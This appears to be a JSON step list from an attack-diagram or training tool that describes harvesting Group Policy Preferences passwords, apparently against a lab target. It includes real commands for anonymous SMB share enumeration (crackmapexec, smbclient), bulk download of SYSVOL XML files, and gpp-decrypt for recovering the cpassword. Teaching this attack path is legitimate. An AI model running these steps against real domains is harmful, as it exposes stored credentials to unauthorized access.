  "steps": [
    {
      "id": 1,
      "name": "Launch Share Enumeration Workflow",
      "type": "edge",
      "from": "attacker_machine",
      "to": "gpp_tool",
      "description": "The attacker uses share-enumeration and SMB client tooling to hunt for legacy GPP XML files.",
      "cli": "crackmapexec smb 10.129.2.16 -u '' -p '' --shares\nsmbclient -L \\\\10.129.2.16\\"
    },
    {
      "id": 2,
      "name": "Reach Policy Share Surface",
      "type": "edge",
      "from": "gpp_tool",
      "to": "corporate_network",
      "description": "The attacker reaches the corporate share path where SYSVOL or replication data is hosted."
    },
    {
      "id": 3,
      "name": "Browse and Download XML Artifacts",
      "type": "edge",
      "from": "corporate_network",
      "to": "domain_controller",
      "description": "The readable policy share exposes preference XML files containing legacy cpassword values.",
      "cli": "prompt off\nrecurse on\nmget *"
    },
    {
      "id": 4,
      "name": "Return Candidate GPP Files",
      "type": "edge",
      "from": "domain_controller",
      "to": "gpp_tool",
      "description": "The XML files are copied locally for offline inspection and decryption."
    },
    {
      "id": 5,
      "name": "Decrypt Legacy Password",
      "type": "edge",
      "from": "gpp_tool",
      "to": "plaintext_credential",
      "description": "The cpassword value is decrypted locally with the known GPP static key.",
      "cli": "gpp-decrypt <cpassword>"
    }
  ],
  "visibility": {
    "plaintext_credential": {
      "start": 5,
      "end": 100
    }
  },
  "attackMatrixOpen": false,
  "sizeControlsOpen": false
